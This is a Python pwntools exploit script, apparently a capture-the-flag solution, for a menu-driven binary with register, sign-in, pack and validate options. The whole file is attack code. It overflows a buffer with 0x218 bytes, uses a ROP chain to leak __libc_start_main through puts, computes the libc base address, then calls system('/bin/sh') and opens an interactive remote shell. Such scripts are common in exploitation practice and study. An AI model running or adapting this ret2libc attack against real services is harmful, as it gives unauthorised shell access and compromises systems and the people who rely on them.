#!/usr/bin/env python
import sys, os
from pwn import *

log.warning('Usage: ./exp.py [HOST] [PORT]')
prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
elf = ELF(prog)
if not elf: log.warning('Cannot open ' + prog)
libc = ELF('libc.so.6') if len(sys.argv) > 2 else elf.libc
if not libc: log.warning('Cannot open libc.so.6')
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
context.word_size = 64 if '64' in elf.arch else 32 # amd64, aarch64, powerpc64, mips64

def register(name, pw):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Name: ', name)
    r.sendlineafter('Password: ', pw)

def signin(name, pw):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Name: ', name)
    r.sendlineafter('Password: ', pw)

def pack_data(data):
    r.sendlineafter('> ', '3')
    r.sendlineafter('pack? ', data)

def validate_data():
    r.sendlineafter('> ', '4')

r = remote(HOST, PORT, level='WARN')

# login
register('dada', 'dada')
signin('\x05\x05\x05a', '\x05\x05\x05a')

main = 0x401365
pop_rdi = 0x401483

# leak libc_base
exp = flat(
    'a'*0x218, pop_rdi, elf.got['__libc_start_main'], elf.symbols['puts'], main
)
pack_data(exp)
validate_data()
r.recvline()
leak = r.leak()
log.info('__libc_start_main: ' + hex(leak))
libc_base = leak - libc.symbols['__libc_start_main']
log.info('libc_base: ' + hex(libc_base))
libc.address += libc_base

# shell out 
exp = flat(
    'a'*0x218, pop_rdi, libc.binsh, libc.symbols['system']
)
pack_data(exp)
validate_data()

r.interactive()
